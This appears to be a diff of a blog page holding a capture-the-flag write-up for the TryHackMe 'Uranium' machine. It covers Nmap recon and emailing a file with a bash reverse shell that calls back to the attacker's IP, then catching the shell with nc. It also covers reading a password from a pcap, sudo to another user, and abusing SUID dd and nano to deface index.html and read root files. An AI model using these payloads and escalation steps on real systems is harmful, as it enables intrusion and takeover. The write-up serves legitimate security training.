--rwsrwxrwx <span style=color:#ae81ff>1</span> root  root  <span style=color:#ae81ff>245872</span> Aug <span style=color:#ae81ff>21</span> 11:40 nano
--rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .profile
--rw-rw-r-- <span style=color:#ae81ff>1</span> kral4 kral4     <span style=color:#ae81ff>38</span> Apr <span style=color:#ae81ff>10</span> 00:21 user_2.txt
-You have new mail in /var/mail/kral4
-</code></pre></div><p>Perfect! We have now the <code>SUID</code> in the <code>nano</code> binary, so we can read the remaining flags!</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ ./nano /root/root.txt
-kral4@uranium:/home/kral4$ ./nano /var/www/html/web_flag.txt
-</code></pre></div><p>And we &ldquo;rooted&rdquo; the machine!</p>
-<p>That&rsquo;s all from my side, hope you find this helpful!</p>
-</div>
-<div class=pagination>
+<td><a href=https://tryhackme.com/room/uranium>Here</a></td><td>Hard</td><td><a href=https://tryhackme.com/p/hakanbey01>hakanbey01</a></td></tr></tbody></table><h2 id=reconn>Reconn</h2><p>As in every CTF, we ran <a href=https://github.com/lanfran02/YAAS>YAAS</a> to get information about the machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>__  _____    ___   _____
+</span></span><span style=display:flex><span><span style=color:#ae81ff>\ \/</span> /   |  /   | / ___/
+</span></span><span style=display:flex><span> <span style=color:#ae81ff>\ </span> / /| | / /| | <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\ </span> Yet Another Automation Script
+</span></span><span style=display:flex><span> / / ___ |/ ___ |___/ /  Version 1.1 LOCAL
+</span></span><span style=display:flex><span>/_/_/  |_/_/  |_/____/   -By Lanfran02
+</span></span><span style=display:flex><span>			 <span style=color:#f92672>(</span>https://github.com/lanfran02/YAAS<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> ----------------
+</span></span><span style=display:flex><span>|                |
+</span></span><span style=display:flex><span>| Final output:  |
+</span></span><span style=display:flex><span>|                |
+</span></span><span style=display:flex><span> ----------------
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Tun0 IP             :  10.9.1.53
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Machine IP          :  10.10.193.48
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Created Files       :  Nmap Result <span style=color:#f92672>(</span>nmap_Scan<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Open Port/s         :  22,25,80
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SSH Server/s found? :  YES
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> FTP Server/s found? :  NO
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Web Server/s found? :  YES
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Samba Server found? :  NO
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.91 scan initiated Sat Aug 21 13:43:15 2021 as: nmap -sS -sV -sC -p 22,25,80 -o nmap_Scan 10.10.193.48</span>
+</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.193.48
+</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.055s latency<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>25/tcp open  smtp    Postfix smtpd
+</span></span><span style=display:flex><span>|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
+</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>uranium
+</span></span><span style=display:flex><span>| Subject Alternative Name: DNS:uranium
+</span></span><span style=display:flex><span>| Not valid before: 2021-04-09T21:40:53
+</span></span><span style=display:flex><span>|_Not valid after:  2031-04-07T21:40:53
+</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
+</span></span><span style=display:flex><span>Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Sat Aug 21 13:43:46 2021 -- 1 IP address (1 host up) scanned in 30.56 seconds</span>
+</span></span></code></pre></div><p>So, we have an <code>smtp</code> server runnin, a <code>web</code> server and a <code>ssh</code> service running.</p><p>But the creator give us a twitter account, so let&rsquo;s recon it too!</p><p>Reading the twitter, we get some information&mldr;
+<img src=recon.png alt=recon></p><ol>
+<li>We have now a domain and an email.</li><li>We know that the user opens the mail&rsquo;s content in his terminal and expects a file with the name &ldquo;application&rdquo;.</li></ol><h2 id=foothold---users>Foothold - Users</h2><p>What if we send an email with an &ldquo;application&rdquo; with a reverse shell??</p><p>You can get the reverse shell from this site <a href=https://www.revshells.com/>revshells</a></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ cat application                                                                                                ─╯
+</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
+</span></span><span style=display:flex><span>bash -c <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.9.1.53/1337 0&gt;&amp;1&#34;</span>
+</span></span></code></pre></div><p>Let&rsquo;s send the email now!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ sendEmail -t hakanbey@uranium.thm -f lanfran@mail.com -s 10.10.105.19 -u <span style=color:#e6db74>&#34;Im an exploit :)&#34;</span> -m <span style=color:#e6db74>&#34;Im gonna hack you&#34;</span> -a application -o tls<span style=color:#f92672>=</span>no
+</span></span><span style=display:flex><span>Aug <span style=color:#ae81ff>21</span> 12:50:21 parrot sendEmail<span style=color:#f92672>[</span>1992588<span style=color:#f92672>]</span>: Email was sent successfully!
+</span></span></code></pre></div><p>And after some seconds we get a reverse shell with the user hakanbey!!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                       ─╯
+</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
+</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.9.1.54<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.105.19<span style=color:#f92672>]</span> <span style=color:#ae81ff>48468</span>
+</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>1494<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
+</span></span><span style=display:flex><span>bash: no job control in this shell
+</span></span><span style=display:flex><span>hakanbey@uranium:~$ ls
+</span></span><span style=display:flex><span>chat_with_kral4  mail_file  user_1.txt
+</span></span><span style=display:flex><span>hakanbey@uranium:~$ cat user_1.txt 
+</span></span><span style=display:flex><span>thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</span></span></code></pre></div><p>We can read the flag from the user_1!</p><p>Here comes the second part of the recon :)</p><p>After digging all arround the machine&mldr;</p><p>We foud a pcap file, so I downloaded and read it with wireshark</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hakanbey@uranium:~$ find / -name *.pcap 2&gt; /dev/null 
+</span></span><span style=display:flex><span>/var/log/hakanbey_network_log.pcap
+</span></span></code></pre></div><p>This is a log from a communication and we have a plain text password!</p><p><img src=password.png alt=password></p><p>Perfect!! We have the password to start the chat binary!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hakanbey@uranium:~$ ./chat_with_kral4 
+</span></span><span style=display:flex><span>PASSWORD :<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>kral4:hi hakanbey
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-&gt;hi
+</span></span><span style=display:flex><span>hakanbey:hi
+</span></span><span style=display:flex><span>kral4:how are you?
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-&gt;fine and you ?
+</span></span><span style=display:flex><span>hakanbey:fine and you ?
+</span></span><span style=display:flex><span>kral4:what now? did you forgot your password again
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>-&gt;yes
+</span></span><span style=display:flex><span>hakanbey:yes
+</span></span><span style=display:flex><span>kral4:okay your password is <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> don<span style=color:#960050;background-color:#1e0010>&#39;</span>t lose it PLEASE
+</span></span><span style=display:flex><span>kral4:i have to go
+</span></span><span style=display:flex><span>kral4 disconnected
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>connection terminated
+</span></span><span style=display:flex><span>hakanbey@uranium:~$ sudo -l 
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> hakanbey: 
+</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> hakanbey on uranium:
+</span></span><span style=display:flex><span>    env_reset,
+</span></span><span style=display:flex><span>    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User hakanbey may run the following commands on uranium:
+</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> /bin/bash
+</span></span><span style=display:flex><span>hakanbey@uranium:~$ 
+</span></span></code></pre></div><p>So we can now <code>sudo</code> into kral4 and read the flag!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hakanbey@uranium:~$ sudo -u kral4 /bin/bash
+</span></span><span style=display:flex><span>kral4@uranium:~$ id
+</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>kral4@uranium:~$ cat /home/kral4/user_2.txt 
+</span></span><span style=display:flex><span>thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
+</span></span></code></pre></div><h2 id=root>Root</h2><p>After using <code>LinPeas</code> I found the mail folder for our user, with one interesting mail on it.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kral4@uranium:/home/kral4$ cd /var/mail
+</span></span><span style=display:flex><span>kral4@uranium:/var/mail$ ls
+</span></span><span style=display:flex><span>hakanbey  kral4
+</span></span><span style=display:flex><span>kral4@uranium:/var/mail$ cat kral4 
+</span></span><span style=display:flex><span>From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>Return-Path: &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>X-Original-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Delivered-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
+</span></span><span style=display:flex><span>From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
+</span></span><span style=display:flex><span>Subject: Hi Kral4
+</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
+</span></span><span style=display:flex><span>X-Mailer: sendEmail-1.56
+</span></span><span style=display:flex><span>MIME-Version: 1.0
+</span></span><span style=display:flex><span>Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
+</span></span><span style=display:flex><span>Content-Type: text/plain;
+</span></span><span style=display:flex><span>        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
+</span></span><span style=display:flex><span>Content-Transfer-Encoding: 7bit
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--
+</span></span></code></pre></div><p>What we know so far, the <code>root</code> user sent an email to <code>kral4</code> saying that &ldquo;if we get an attack again, I will give <code>SUID</code> to the <code>nano</code> binary in your home folder&rdquo;.</p><p>After that I searched for <code>SUID</code> binaries, and I found a very interesting one&mldr;</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>-perm /4000 -type f -exec ls -ld <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> 2&gt;/dev/null
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>113528</span> Feb  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2021</span> /usr/lib/snapd/snap-confine
+</span></span><span style=display:flex><span>-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>42992</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>436552</span> Mar  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> /usr/lib/openssh/ssh-keysign
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>14328</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10232</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>100760</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22520</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/bin/pkexec
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>75824</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/gpasswd
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40344</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgrp
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>59640</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/passwd
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newuidmap
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44528</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chsh
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>18448</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /usr/bin/traceroute6.iputils
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgidmap
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>76496</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chfn
+</span></span><span style=display:flex><span>-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>51464</span> Feb <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2018</span> /usr/bin/at
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>149080</span> Jan <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>26696</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/umount
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>64424</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /bin/ping
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44664</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /bin/su
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Aug <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
+</span></span><span style=display:flex><span>-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>43088</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/mount
+</span></span><span style=display:flex><span>-rwsr-x--- <span style=color:#ae81ff>1</span> web kral4 <span style=color:#ae81ff>76000</span> Apr <span style=color:#ae81ff>23</span> 10:52 /bin/dd
+</span></span></code></pre></div><p><code>dd</code> It&rsquo;s used to write data to files, sooo&mldr;.</p><p>We can use it to modify the index. Here it&rsquo;s the <a href=https://gtfobins.github.io/gtfobins/dd/>GTFOBins page to exploit it</a>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>kral4@uranium:/home/kral4$ LFILE<span style=color:#f92672>=</span>/var/www/html/index.html 
+</span></span><span style=display:flex><span>kral4@uranium:/home/kral4$ echo <span style=color:#e6db74>&#34;Dumped by lanfran02&#34;</span> | /bin/dd of<span style=color:#f92672>=</span>$LFILE
+</span></span><span style=display:flex><span>0+1 records in
+</span></span><span style=display:flex><span>0+1 records out
+</span></span><span style=display:flex><span><span style=color:#ae81ff>20</span> bytes copied, 0.000148921 s, <span style=color:#ae81ff>134</span> kB/s
+</span></span><span style=display:flex><span>kral4@uranium:/home/kral4$ cat /var/mail/kral4                           
+</span></span><span style=display:flex><span>From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>Return-Path: &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>X-Original-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Delivered-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
+</span></span><span style=display:flex><span>From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
+</span></span><span style=display:flex><span>Subject: Hi Kral4
+</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
+</span></span><span style=display:flex><span>X-Mailer: sendEmail-1.56
+</span></span><span style=display:flex><span>MIME-Version: 1.0
+</span></span><span style=display:flex><span>Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
+</span></span><span style=display:flex><span>Content-Type: text/plain;
+</span></span><span style=display:flex><span>        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
+</span></span><span style=display:flex><span>Content-Transfer-Encoding: 7bit
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>From root@uranium.thm  Sat Aug <span style=color:#ae81ff>21</span> 11:25:17 <span style=color:#ae81ff>2021</span>
+</span></span><span style=display:flex><span>Return-Path: &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>X-Original-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Delivered-To: kral4@uranium.thm
+</span></span><span style=display:flex><span>Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
+</span></span><span style=display:flex><span>	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id A476F401A5
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Message-ID: &lt;35569.014816673-sendEmail@uranium&gt;
+</span></span><span style=display:flex><span>From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
+</span></span><span style=display:flex><span>To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
+</span></span><span style=display:flex><span>Subject: Hi Kral4
+</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000
+</span></span><span style=display:flex><span>X-Mailer: sendEmail-1.56
+</span></span><span style=display:flex><span>MIME-Version: 1.0
+</span></span><span style=display:flex><span>Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-939019.459839077&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077
+</span></span><span style=display:flex><span>Content-Type: text/plain;
+</span></span><span style=display:flex><span>        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
+</span></span><span style=display:flex><span>Content-Transfer-Encoding: 7bit
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>I think our index page has been hacked again. You know how to fix it, I am giving authorization.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077--
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>kral4@uranium:/home/kral4$ ls -la
+</span></span><span style=display:flex><span>total <span style=color:#ae81ff>384</span>
+</span></span><span style=display:flex><span>drwxr-x--- <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>21</span> 11:40 .
+</span></span><span style=display:flex><span>drwxr-xr-x <span style=color:#ae81ff>4</span> root  root    <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span> 08:50 ..
